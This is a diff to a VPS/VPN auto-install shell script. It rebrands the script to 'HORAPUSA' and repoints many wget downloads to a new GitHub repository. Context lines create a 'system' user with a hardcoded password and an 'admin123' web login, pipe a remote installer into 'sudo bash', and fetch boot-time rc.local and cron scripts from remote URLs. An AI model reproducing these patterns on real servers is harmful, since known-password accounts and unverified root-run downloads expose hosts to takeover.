@@ -96,11 +96,11 @@ case $Accounts in
                 wget -O deltr "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/Files/Menu2/deltr.sh"
                 wget -O cekws "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/Files/Menu2/cekws.sh"
                 wget -O cekvless "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/cekvless.sh"
-                wget -O cektr "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Menu2/cektr.sh"
-                wget -O renewws "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Menu2/renewws.sh"
-                wget -O renewvless "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Menu2/renewvless.sh"
-                wget -O renewtr "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Menu2/renewtr.sh"
-                wget -O certv2ray "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Menu2/cert.sh"
+                wget -O cektr "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/cektr.sh"
+                wget -O renewws "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/renewws.sh"
+                wget -O renewvless "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/renewvless.sh"
+                wget -O renewtr "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/renewtr.sh"
+                wget -O certv2ray "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Menu2/cert.sh"
                 chmod +x addws
                 chmod +x addvless
                 chmod +x addtr
@@ -154,7 +154,7 @@ case $Accounts in
                 5)
                 clear
                 echo -e "${color1}========================================${color3}"
-        echo -e "* ${color2}SCRIPT AUTO INSTALL BY KingKongVPN ${color3}*"
+        echo -e "* ${color2}SCRIPT AUTO INSTALL BY HORAPUSA ${color3}*"
         echo -e "${color1}========================================${color3}"
                 rm AutoScript
                 exit
@@ -592,7 +592,7 @@ NUovpn
 
  # Getting some OpenVPN plugins for unix authentication
  cd
- wget https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/plugin.tgz
+ wget https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/Files/Other/plugin.tgz
  tar -xzvf /root/plugin.tgz -C /etc/openvpn/
  rm -f plugin.tgz
 
@@ -619,9 +619,9 @@ chmod +x /etc/openvpn/openvpn.bash
  autokill 2
 
 # Setting Server
-wget -O /etc/rc.local "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/rc.local"
+wget -O /etc/rc.local "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Other/rc.local"
 chmod +x /etc/rc.local
-#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/iptables.up.rules"
+#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Other/iptables.up.rules"
 #sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 #iptables-restore < /etc/iptables.up.rules
 # Badvpn
@@ -666,7 +666,7 @@ apt-get install -y openssl >/dev/null 2>/dev/null
 apt-get install -y build-essential >/dev/null 2>/dev/null
 apt-get install -y cmake >/dev/null 2>/dev/null
 echo -e "\033[1;37mDownloading File Badvpn"; cd
-wget https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/BadVPN/badvpn-1.999.128.tar.bz2 -o /dev/null
+wget https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/BadVPN/badvpn-1.999.128.tar.bz2 -o /dev/null
 echo -e "Extract Badvpn"
 tar -xf badvpn-1.999.128.tar.bz2
 echo -e "Setup configuration"
@@ -684,9 +684,9 @@ cd ; rm -rf badvpn.sh badvpn-1.999.128/ badvpn-1.999.128.tar.bz2 >/dev/null 2>/d
 
 # Stunnel
 apt-get install stunnel4 -y
-wget -P /etc/stunnel/ "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Stunnel/stunnel.conf"
+wget -P /etc/stunnel/ "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Stunnel/stunnel.conf"
  # Creating stunnel certifcate using openssl
-openssl req -new -x509 -days 9999 -nodes -subj "/C=MY/ST=SBH/L=TWU/O=KingKongVPN/OU=KingKongVPN/CN=KingKongVPN" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
+openssl req -new -x509 -days 9999 -nodes -subj "/C=MY/ST=SBH/L=TWU/O=HORAPUSAVPN/OU=HORAPUSAVPN/CN=HORAPUSAVPN" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
 ##  > /dev/null 2>&1
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 
@@ -694,9 +694,9 @@ sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 apt-get -y install nginx libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Nginx/nginx.conf"
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Nginx/nginx.conf"
 mkdir -p /home/vps/public_html
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Nginx/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Nginx/vps.conf"
 
 # install vnstat gui
 apt-get install vnstat
@@ -807,7 +807,7 @@ iptables -A INPUT -s $(wget -4qO- http://ipinfo.io/ip) -p tcp -m multiport --dpo
 sed -i '$ i\bash /etc/openvpn/openvpn.bash' /etc/rc.local
 
 ### OpenVPN Monitor
-wget -O /etc/nginx/conf.d/monitoring.conf "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/monitoring.conf"
+wget -O /etc/nginx/conf.d/monitoring.conf "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/OpenVPN-Monitor/monitoring.conf"
 apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra nginx uwsgi uwsgi-plugin-python geoipupdate
 cd /srv
 git clone https://github.com/furlongm/openvpn-monitor.git
@@ -815,13 +815,13 @@ cd openvpn-monitor
 virtualenv .
 . bin/activate
 pip install -r requirements.txt
-wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/openvpn-monitor.ini"
+wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/OpenVPN-Monitor/openvpn-monitor.ini"
 ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/
 printf "admin:$(openssl passwd -apr1 admin123)\n" >> /etc/nginx/.htpasswd
 cd
 
 # etc
-wget -O /etc/motd "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/motd"
+wget -O /etc/motd "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Other/motd"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 useradd -m system
 echo "system:haiqal2020" | chpasswd
@@ -836,7 +836,7 @@ curl -s https://install.speedtest.net/app/cli/install.deb.sh | sudo bash
 sudo apt-get install speedtest
 
 # Lock Dropbear Expired ID
-wget -O /usr/local/bin/lockidexp.sh "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/lockidexp.sh"
+wget -O /usr/local/bin/lockidexp.sh "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Other/lockidexp.sh"
 chmod +x /usr/local/bin/lockidexp.sh
 crontab -l > mycron
 echo "1 8 * * * /usr/local/bin/lockidexp.sh" >> mycron
@@ -844,7 +844,7 @@ crontab mycron
 rm mycron
 
 # BlockTorrent
-wget -O /usr/local/bin/BlockTorrentEveryReboot "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/BlockTorrentEveryReboot"
+wget -O /usr/local/bin/BlockTorrentEveryReboot "https://raw.githubusercontent.com/BHATHIYA-ROOT/HORAPUSA-VPN/master/Files/Other/BlockTorrentEveryReboot"
 chmod +x /usr/local/bin/BlockTorrentEveryReboot
 crontab -l > mycron
 echo "@reboot /usr/local/bin/BlockTorrentEveryReboot" >> mycron
@@ -881,8 +881,8 @@ clear
 echo -e ""
 echo -e "\e[94m[][][]======================================[][][]" | tee -a log-install.txt
 echo -e "\e[0m                                                   " | tee -a log-install.txt
-echo -e "\e[94m           AutoScriptVPS by KingKongVPN           " | tee -a log-install.txt
-echo -e "\e[94m             https://t.me/xiihaiqal               " | tee -a log-install.txt
+echo -e "\e[94m           AutoScriptVPS by HROAPUSA           " | tee -a log-install.txt
+echo -e "\e[94m             https://t.me/hora_pusa               " | tee -a log-install.txt
 echo -e "\e[94m                    Services                      " | tee -a log-install.txt
 echo -e "\e[94m                                                  " | tee -a log-install.txt
 echo -e "\e[94m    OpenSSH                       :   "$opensshport | tee -a log-install.txt
